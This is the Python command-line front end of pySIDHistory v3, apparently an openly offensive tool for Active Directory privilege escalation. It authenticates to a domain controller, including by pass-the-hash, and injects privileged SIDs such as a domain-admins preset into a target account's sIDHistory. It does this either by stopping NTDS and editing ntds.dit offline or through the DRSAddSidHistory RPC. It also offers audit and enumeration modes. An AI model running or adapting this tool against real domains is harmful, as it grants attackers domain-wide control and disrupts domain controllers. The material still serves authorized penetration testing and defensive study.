#!/usr/bin/env python3
"""
pySIDHistory v3 - Remote SID History Injection & Audit Tool

Author: github.com/felixbillieres
License: MIT
"""

import argparse
import sys
import logging
from typing import Optional

from core import SIDHistoryAttack, AuthenticationManager
from core.output import OutputFormatter


BANNER = r"""
             _____ _____ ____  _   _ _     _
 _ __  _   _/ ___||_ _||  _ \| | | (_)___| |_ ___  _ __ _   _
| '_ \| | | \___ \ | | | | | | |_| | / __| __/ _ \| '__| | | |
| |_) | |_| |___) || | | |_| |  _  | \__ \ || (_) | |  | |_| |
| .__/ \__, |____/|___||____/|_| |_|_|___/\__\___/|_|   \__, |
|_|    |___/                                             |___/
    Remote SID History Injection & Audit Tool  v3
    DSInternals + DRSUAPI | github.com/felixbillieres
"""


def setup_logging(verbose: bool = False, quiet: bool = False):
    """Configure logging.

    Default: only errors (clean output via print statements).
    -v:      DEBUG level, shows full LDAP/SMB/RPC trace.
    -q:      suppress everything except critical errors.
    """
    if quiet:
        level = logging.CRITICAL
    elif verbose:
        level = logging.DEBUG
    else:
        level = logging.ERROR

    logging.basicConfig(
        level=level,
        format='[%(levelname)s] %(message)s',
        handlers=[logging.StreamHandler(sys.stderr)]
    )


def build_parser():
    """Build the argument parser."""
    parser = argparse.ArgumentParser(
        description='pySIDHistory v3 - Remote SID History Injection & Audit Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
injection methods:
  dsinternals  Offline ntds.dit modification via SCMR (default, any SID, brief NTDS downtime)
  drsuapi      DRSAddSidHistory RPC (cross-forest only, RID > 1000, no downtime)

see README.md for usage examples and detailed documentation.
        """
    )

    # ── Connection ──
    conn = parser.add_argument_group('connection')
    conn.add_argument('-d', '--domain', required=True, help='target domain (CORP.LOCAL)')
    conn.add_argument('-dc', '--dc-ip', required=True, help='domain controller IP')
    conn.add_argument('--dc-hostname', help='DC hostname (for Kerberos/SSL)')
    conn.add_argument('--use-ssl', action='store_true', help='use LDAPS (port 636)')

    # ── Authentication ──
    auth = parser.add_argument_group('authentication')
    auth.add_argument('-u', '--username', help='username')
    auth.add_argument('-p', '--password', help='password')
    auth_methods = auth.add_mutually_exclusive_group()
    auth_methods.add_argument('--ntlm-hash', metavar='HASH', help='pass-the-hash (NT or LM:NT)')
    auth_methods.add_argument('--kerberos', action='store_true', help='Kerberos auth (use with --ccache)')
    auth_methods.add_argument('--certificate', action='store_true', help='certificate auth (use with --cert-file/--key-file)')
    auth_methods.add_argument('--simple', action='store_true', help='SIMPLE bind (use with --use-ssl)')
    auth.add_argument('--ccache', help='ccache file for Kerberos')
    auth.add_argument('--cert-file', help='client certificate (.pem)')
    auth.add_argument('--key-file', help='client private key (.pem)')

    # ── Actions ──
    actions = parser.add_argument_group('actions (pick one)')
    action_grp = actions.add_mutually_exclusive_group(required=True)
    action_grp.add_argument('--target', '--target-user', dest='target', help='target object for injection')
    action_grp.add_argument('--query', '--query-user', dest='query', help='query sIDHistory of an object')
    action_grp.add_argument('--lookup', '--lookup-user', dest='lookup', help='resolve object to SID')
    action_grp.add_argument('--audit', action='store_true', help='domain-wide sIDHistory audit')
    action_grp.add_argument('--enum-trusts', action='store_true', help='enumerate domain trusts')
    action_grp.add_argument('--list-presets', action='store_true', help='list well-known SID presets')

    # ── Injection ──
    inject_opts = parser.add_argument_group('injection (with --target)')
    inject_opts.add_argument('--inject', help='SID or preset to inject (domain-admins, S-1-5-21-...-512)')
    inject_opts.add_argument('--inject-domain', help='resolve preset against this domain')
    inject_opts.add_argument('--method', choices=['dsinternals', 'drsuapi'], default='dsinternals',
                             help='injection method (default: dsinternals)')
    inject_opts.add_argument('--force', action='store_true', help='skip confirmation prompt')
    inject_opts.add_argument('--dsinternals-path', help='DSInternals module path on the DC (offline install)')

    # ── DRSUAPI ──
    drsuapi = parser.add_argument_group('drsuapi (with --method drsuapi)')
    drsuapi.add_argument('--source-user', help='source user whose SID to inject')
    drsuapi.add_argument('--source-domain', help='source domain (cross-forest)')
    drsuapi.add_argument('--src-username', help='source domain auth username')
    drsuapi.add_argument('--src-password', help='source domain auth password')
    drsuapi.add_argument('--src-domain', help='source domain auth domain')

    # ── Output ──
    output = parser.add_argument_group('output')
    output.add_argument('-o', '--output-format', choices=['console', 'json', 'csv'],
                       default='console', help='output format (default: console)')
    output.add_argument('--output-file', help='write output to file')
    output.add_argument('--no-color', action='store_true', help='disable colored output')
    output.add_argument('-v', '--verbose', action='store_true', help='debug traces (LDAP, SMB, RPC)')
    output.add_argument('-q', '--quiet', action='store_true', help='suppress non-critical output')
    output.add_argument('--dry-run', action='store_true', help='show what would be done')
    output.add_argument('--no-banner', action='store_true', help='suppress banner')

    return parser


def determine_auth_method(args) -> str:
    """Determine authentication method from args."""
    if args.ntlm_hash:
        return AuthenticationManager.AUTH_NTLM_HASH
    elif args.kerberos:
        return AuthenticationManager.AUTH_KERBEROS
    elif args.certificate:
        return AuthenticationManager.AUTH_CERTIFICATE
    elif args.simple:
        return AuthenticationManager.AUTH_SIMPLE
    return AuthenticationManager.AUTH_NTLM


def validate_arguments(args, auth_method: str, parser) -> bool:
    """Validate argument combinations."""
    if auth_method == AuthenticationManager.AUTH_NTLM:
        if not args.username or not args.password:
            parser.error("NTLM authentication requires -u/--username and -p/--password")

    elif auth_method == AuthenticationManager.AUTH_NTLM_HASH:
        if not args.username:
            parser.error("Pass-the-Hash requires -u/--username")

    elif auth_method == AuthenticationManager.AUTH_CERTIFICATE:
        if not args.cert_file or not args.key_file:
            parser.error("Certificate auth requires --cert-file and --key-file")

    elif auth_method == AuthenticationManager.AUTH_SIMPLE:
        if not args.username or not args.password:
            parser.error("SIMPLE auth requires -u/--username and -p/--password")

    # Target action validation
    if args.target:
        method = args.method

        if method == 'dsinternals':
            if not args.inject:
                parser.error("--target with --method dsinternals (default) requires --inject")

        elif method == 'drsuapi':
            if not args.source_user:
                parser.error("--target with --method drsuapi requires --source-user and --source-domain")
            if args.source_user and not args.source_domain:
                parser.error("--source-user requires --source-domain (DRSAddSidHistory is cross-forest only)")

    return True


def build_auth_params(args, auth_method: str) -> dict:
    """Build authentication parameters dict."""
    params = {'use_ssl': args.use_ssl, 'username': args.username, 'password': args.password}

    if auth_method == AuthenticationManager.AUTH_NTLM_HASH:
        params['nt_hash'] = args.ntlm_hash
    elif auth_method == AuthenticationManager.AUTH_KERBEROS:
        params['ccache_path'] = args.ccache
        params.pop('username', None)
        params.pop('password', None)
    elif auth_method == AuthenticationManager.AUTH_CERTIFICATE:
        params['cert_file'] = args.cert_file
        params['key_file'] = args.key_file
        params.pop('password', None)

    return params


def handle_query(attacker: SIDHistoryAttack, formatter: OutputFormatter, username: str):
    """Handle --query action."""
    sid_history = attacker.get_current_sid_history(username)
    object_sid = attacker.get_user_sid(username)
    print(formatter.format_sid_history(username, sid_history, object_sid))


def handle_lookup(attacker: SIDHistoryAttack, formatter: OutputFormatter, username: str):
    """Handle --lookup action."""
    sid = attacker.get_user_sid(username)
    if sid:
        print(formatter.format_sid_lookup(username, sid))
    else:
        print(f"\nObject '{username}' not found")


def handle_audit(attacker: SIDHistoryAttack, formatter: OutputFormatter):
    """Handle --audit action."""
    report = attacker.full_audit()
    if report:
        print(formatter.format_audit_report(report))
    else:
        print("[-] Audit failed", file=sys.stderr)


def handle_trusts(attacker: SIDHistoryAttack, formatter: OutputFormatter):
    """Handle --enum-trusts action."""
    trusts = attacker.enumerate_trusts()
    print(formatter.format_trusts(trusts))


def handle_presets(attacker: SIDHistoryAttack, formatter: OutputFormatter):
    """Handle --list-presets action."""
    domain_sid = attacker.get_domain_sid()
    if domain_sid:
        print(formatter.format_presets(domain_sid))
    else:
        logging.error("Could not determine domain SID")


def handle_target(attacker: SIDHistoryAttack, formatter: OutputFormatter,
                  args, dry_run: bool = False) -> bool:
    """Handle --target action (injection dispatch)."""
    target = args.target
    method = args.method

    if method == 'dsinternals':
        # DSInternals injection path
        if dry_run:
            sid = attacker.resolve_inject_sid(args.inject, args.inject_domain)
            print(f"[DRY-RUN] Would inject SID {sid or args.inject} into {target}")
            print(f"[DRY-RUN] Method: DSInternals (offline ntds.dit modification)")
            if args.inject_domain:
                print(f"[DRY-RUN] Source domain: {args.inject_domain}")
            return True

        # Interactive warning before injection
        if not args.force:
            print("\n" + "=" * 60)
            print("  WARNING: DSInternals SID History Injection")
            print("=" * 60)
            print(f"  Target:  {target}")
            print(f"  Inject:  {args.inject}")
            if args.inject_domain:
                print(f"  Domain:  {args.inject_domain}")
            print(f"  DC:      {args.dc_ip}")
            print()
            print("  This will STOP the NTDS service on the DC,")
            print("  modify ntds.dit offline, then RESTART NTDS.")
            print("  The DC will be briefly unavailable.")
            print("=" * 60)
            try:
                answer = input("\n  Proceed? [y/N] ").strip().lower()
                if answer not in ('y', 'yes'):
                    print("Aborted.")
                    return False
            except (EOFError, KeyboardInterrupt):
                print("\nAborted.")
                return False

        success = attacker.inject_sid_history(
            target, method='dsinternals',
            inject_value=args.inject,
            inject_domain=args.inject_domain,
            dsinternals_path=args.dsinternals_path,
        )

    elif method == 'drsuapi':
        # DRSUAPI legacy path
        if dry_run:
            source_sid = attacker.get_user_sid(args.source_user)
            print(f"[DRY-RUN] Would inject SID of {args.source_user}@{args.source_domain} into {target}")
            if source_sid:
                print(f"[DRY-RUN] Source SID: {source_sid}")
            print(f"[DRY-RUN] Method: DRSUAPI (DRSAddSidHistory opnum 20)")
            return True

        src_creds_user = getattr(args, 'src_username', '') or ''
        src_creds_password = getattr(args, 'src_password', '') or ''
        src_creds_domain = getattr(args, 'src_domain', '') or args.source_domain or ''

        success = attacker.inject_sid_history(
            target, method='drsuapi',
            source_user=args.source_user,
            source_domain=args.source_domain,
            src_creds_user=src_creds_user,
            src_creds_domain=src_creds_domain,
            src_creds_password=src_creds_password,
        )

    else:
        logging.error(f"Unknown method: {method}")
        return False

    if success:
        print(f"\n[+] sIDHistory modified successfully")
        # Show updated history
        updated = attacker.get_current_sid_history(target)
        if updated:
            print(formatter.format_sid_history(target, updated))

    return success


def main():
    """Main entry point."""
    parser = build_parser()
    args = parser.parse_args()

    setup_logging(args.verbose, args.quiet)

    if not args.no_banner and not args.quiet and args.output_format == 'console':
        print(BANNER, file=sys.stderr)

    auth_method = determine_auth_method(args)
    validate_arguments(args, auth_method, parser)

    # Initialize
    attacker = SIDHistoryAttack(
        dc_ip=args.dc_ip,
        domain=args.domain,
        dc_hostname=args.dc_hostname
    )

    # Authenticate
    auth_params = build_auth_params(args, auth_method)
    if not attacker.authenticate(auth_method, **auth_params):
        print("[-] Authentication failed", file=sys.stderr)
        sys.exit(1)

    # Setup formatter
    formatter = OutputFormatter(
        format_type=args.output_format,
        no_color=args.no_color,
        domain_sid=attacker.get_domain_sid()
    )

    # Output redirect
    output_file = None
    if args.output_file:
        try:
            output_file = open(args.output_file, 'w')
            import builtins
            original_print = builtins.print
            def file_print(*a, **kw):
                kw['file'] = output_file
                original_print(*a, **kw)
            builtins.print = file_print
        except Exception as e:
            logging.error(f"Cannot open output file: {e}")

    try:
        # ── Execute action ──
        if args.query:
            handle_query(attacker, formatter, args.query)

        elif args.lookup:
            handle_lookup(attacker, formatter, args.lookup)

        elif args.audit:
            handle_audit(attacker, formatter)

        elif args.enum_trusts:
            handle_trusts(attacker, formatter)

        elif args.list_presets:
            handle_presets(attacker, formatter)

        elif args.target:
            success = handle_target(attacker, formatter, args, dry_run=args.dry_run)
            sys.exit(0 if success else 1)

    except KeyboardInterrupt:
        print("\n[!] Cancelled by user", file=sys.stderr)
        sys.exit(130)
    except Exception as e:
        print(f"[-] Error: {e}", file=sys.stderr)
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)
    finally:
        attacker.disconnect()
        if output_file:
            output_file.close()
            import builtins
            builtins.print = original_print


if __name__ == '__main__':
    main()
